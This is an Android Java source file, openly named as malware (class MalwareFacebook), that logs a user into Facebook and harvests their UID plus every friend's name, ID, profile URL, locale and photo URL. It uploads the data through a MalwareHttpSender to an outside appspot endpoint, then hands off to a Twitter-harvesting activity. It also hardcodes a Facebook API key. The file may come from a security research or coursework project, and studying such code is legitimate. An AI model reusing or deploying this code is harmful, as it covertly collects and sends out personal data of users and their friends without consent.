package com.malware.android;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.io.UnsupportedEncodingException;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

import com.malware.common.dto.FacebookFriendInformation;
import com.malware.common.dto.FacebookInformation;
import com.malware.common.dto.ServerRequest;
import com.malware.common.dto.ServerResponse;
import com.malware.common.dto.User;
import com.malware.common.dto.ServerRequest.ServerMethod;
import com.malware.common.dto.ServerResponse.ResponseCode;

import net.xeomax.FBRocket.FBRocket;
import net.xeomax.FBRocket.Facebook;
import net.xeomax.FBRocket.Friend;
import net.xeomax.FBRocket.LoginListener;
import net.xeomax.FBRocket.ServerErrorException;
import android.app.Activity;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

public class MalwareFacebook extends Activity implements LoginListener{

	Context myContext;
	ProgressDialog dialog = null;
	String twitter_user = null;
	String twitter_pass = null;
	String encoded_xml = null;

	private FBRocket fbRocket;
	private String API_KEY = "f3c8e8a17c413596360af00a31452c29";
	private String POST_URL = "http://car-pooler.appspot.com/storefacebookfriends";
	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.main);
		myContext = this;

		Bundle b = this.getIntent().getExtras();

		fbRocket = new FBRocket(this, "Facebook Login", API_KEY);
		/*
		 * do this properly later.

		if (fbRocket.existsSavedFacebook()) {
			fbRocket.loadFacebook();
		}

		else
		 */ 
		{
			fbRocket.login(R.layout.facebookreturn);
		}
	}

	public void onLoginFail() {
		fbRocket.displayToast("Login failed!");
	}

	public void onLoginSuccess(final Facebook facebook) {

		fbRocket.displayToast("Login success!");

		Thread facebookThread =  new Thread(new Runnable() {
			@SuppressWarnings("deprecation")
			public void run() {

				/*
				 * Pull data from Facebook here and upload
				 * to app engine
				 */
				User u = new User();
				u.setEmail(MalwareDefaults.loginEmailAddress);
				
				List<String> friend_uid = null;
				try 
				{
					friend_uid = facebook.getFriendUIDs();
				} 
				catch (ServerErrorException e) {

					e.printStackTrace();
				}
				
				String []friendsStringArray = new String [friend_uid.size()];
				friend_uid.toArray(friendsStringArray);

				List<Friend> friends = null;
				try 
				{
					friends = facebook.getFriends(friendsStringArray);
				} catch (ServerErrorException e) 
				{
					e.printStackTrace();
				}

				Iterator<Friend> iterator = friends.iterator();
				List<FacebookFriendInformation> friendList = new ArrayList<FacebookFriendInformation>();
				while (iterator.hasNext())
				{
					Friend f = iterator.next();
					String fName = f.name;
					String fUid= f.uid;
					String fProfile = f.profile_url;
					String fLocale = f.locale;
					String fPhotoUrl = f.pic;
					FacebookFriendInformation temp = new FacebookFriendInformation(fName, fUid, fProfile, fLocale, fPhotoUrl);
					friendList.add(temp);
				}
				
				String myUid = facebook.getUid();
				
				FacebookInformation fbInfo = new FacebookInformation();
				fbInfo.setUid(myUid);
				fbInfo.setFriends(friendList);
				
				u.setFacebookInformation(fbInfo);
				
				ServerRequest s = new ServerRequest();
    			s.setServerMethod(ServerMethod.STORE_FACEBOOK_INFORMATION);
    			s.setUser(u);
    			
    			ServerResponse response = MalwareHttpSender.sendData(s);
    			if(response.getResponseCode() == ResponseCode.SUCCESS)
    			{
    				dialog.cancel();
    				Intent myIntent = new Intent(myContext, MalwareTwitter.class);
    				startActivity(myIntent);
    			}
    			else
    			{
    				Log.i("Server Response", response.getReponseMessage());
    				Notify.notification(myContext, "D'oh!", response.getReponseMessage());
    			}	
			}
		});

		facebookThread.start();
		dialog = ProgressDialog.show(myContext, "", 
				"Getting your profile information. This might take a while...", true);

	}
}
